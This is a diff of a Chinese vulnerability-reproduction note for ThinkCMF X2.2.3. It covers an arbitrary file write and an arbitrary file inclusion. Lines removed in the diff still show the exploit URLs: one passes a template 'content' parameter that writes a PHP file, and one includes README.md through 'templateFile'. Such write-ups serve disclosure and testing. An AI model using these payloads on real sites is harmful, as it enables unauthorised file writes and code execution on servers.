@@ -32,17 +32,11 @@ ThinkCMF X2.2.3
 
 任意文件写入漏洞复现：  
 浏览器下访问  
-\```
-?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('test.php','<?php phpinfo(); ?>')</php>
-\```
 访问test.php，可以看到phpinfo已经加载出来
 ![image](./0.png)
 
 任意文件包含漏洞复现：  
-浏览器访问  
-\```
-?a=display&templateFile=README.md
-\```
+浏览器下访问  
 可以看到成功包含了README.md
 ![image](./1.png)
 
